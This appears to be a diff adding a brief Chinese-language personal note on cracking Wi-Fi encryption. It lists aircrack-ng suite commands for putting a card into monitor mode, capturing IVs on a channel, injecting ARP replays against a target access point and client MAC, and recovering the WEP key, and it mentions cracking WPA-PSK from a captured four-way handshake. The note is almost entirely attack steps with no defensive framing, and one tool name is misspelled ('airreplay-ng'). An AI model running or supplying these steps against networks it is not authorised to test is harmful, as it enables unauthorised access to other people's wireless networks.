@@ -1,0 +1,17 @@
+wep破解
+1、设置无线网卡为监听模式
+airmon-ng start wlan0
+
+2、抓包
+airodump-ng mon0  #预探测
+airodump-ng --ivs -w test -c 6 wlan0 #-c:channel
+
+3、注入
+airreplay-ng -3 -b ssid_mac -h station_mac mon0
+
+4、破解
+aircrack-ng test-01.ivs
+
+wpa破解：抓取WPA-PSK四次握手包进行破解
+minidewep-gtk
+
